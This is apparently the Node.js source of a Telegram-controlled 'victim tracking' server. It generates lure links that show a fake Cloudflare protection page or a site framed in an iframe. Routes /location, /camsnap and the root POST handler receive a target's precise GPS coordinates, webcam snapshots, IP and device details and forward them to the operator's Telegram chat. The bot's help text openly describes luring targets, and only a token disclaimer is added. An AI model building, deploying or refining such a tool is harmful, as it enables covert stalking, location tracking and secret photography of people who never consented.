const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// Ganti token Telegram bot Anda di sini
const botToken = 'YOUR_TOKEN'; // Ganti dengan token bot Telegram Anda
const chatID = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda

const bot = new TelegramBot(botToken, {polling: true});
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Modify your URL here
var hostURL = "YOUR_URL"; // Ganti dengan URL yang sesuai
// TOGGLE for Shorters
var use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    // Dekode base64 URL yang aman
    var decodedUri = atob(req.params.uri.replace(/-/g, '+').replace(/_/g, '/')); // Ganti karakter yang diganti

    if (req.params.path != null) {
        res.render("webview", { ip: ip, time: d, url: decodedUri, uid: req.params.path, a: hostURL, t: use1pt });
    } else {
        res.redirect("https://t.me/hanjun");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    // Dekode base64 URL yang aman
    var decodedUri = atob(req.params.uri.replace(/-/g, '+').replace(/_/g, '/')); // Ganti karakter yang diganti

    if (req.params.path != null) {
        res.render("cloudflare", { ip: ip, time: d, url: decodedUri, uid: req.params.path, a: hostURL, t: use1pt });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
        createLink(chatId, msg.text);
    }

    if (msg.text == "/start") {
        var m = {
            reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
        };

        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can track someone just by providing a link.\nYou will get:\n\📱Information about the victim's devices\n\📍The victim's location\n\ 📸 The victim's photo\nType /help for more info.`, m);
    } else if (msg.text == "/create") {
        createNew(chatId);
    } else if (msg.text == "/help") {
        // Track People with Ease Using This Bot
const message = `
💻 How it Works:
Through this bot, you can track people by simply sending a simple link! 👀

1. Send /create to start.
2. After that, you will be asked for a URL which will be used in an iframe to lure your target.
3. Once the URL is received, the bot will provide 2 links to track people.

Specifications 📋:

1. Cloudflare Link 🌩️:
   This method shows a Cloudflare Under Attack page to gather information, then redirects the victim to the target URL.

2. Webview Link 🌐:
   This option displays a website (e.g., Bing, dating sites, etc.) using an iframe to collect information.

🔒 Disclaimer: Use responsibly and ethically. Be mindful of privacy and legal considerations when using such tools.
`;

bot.sendMessage(chatId, message);
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data == "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

async function createLink(cid, msg) {
    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    // Memastikan URL valid
    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
        // Buat base64 URL yang aman
        var base64Url = btoa(msg);

        // Ganti karakter "+" dengan "-" dan "/" dengan "_" untuk menghindari karakter yang tidak aman dalam URL
        base64Url = base64Url.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');  // menghapus padding '='

        // Bangun path dengan format base64 yang aman
        var url = cid.toString(36) + '/' + base64Url;
        
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
            })
        };

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");

        if (use1pt) {
            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

            var f = "", g = "";
            for (var c in x) f += x[c] + "\n";
            for (var c in y) g += y[c] + "\n";

            bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
        } else {
            bot.sendMessage(cid, `New links have been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
        }
    } else {
        bot.sendMessage(cid, `⚠️ Please enter a valid URL, including http or https.`);
        createNew(cid);
    }
}

function createNew(cid) {
    var mk = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.get("/", (req, res) => {
    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }
    res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;

    if (lon != null && lat != null && uid != null && acc != null) {
        bot.sendLocation(parseInt(uid, 36), lat, lon);
        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.send("Done");
    }
});

app.post("/", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var data = decodeURIComponent(req.body.data) || null;

    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (uid != null && data != null) {
        if (data.indexOf(ip) < 0) {
            return res.send("ok");
        }

        data = data.replaceAll("<br>", "\n");

        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
        res.send("Done");
    }
});

app.post("/camsnap", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;

    if (uid != null && img != null) {
        var buffer = Buffer.from(img, 'base64');
        var info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };

        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }

        res.send("Done");
    }
});

app.listen(5000, () => {
    console.log("App Running on Port 5000!");
});
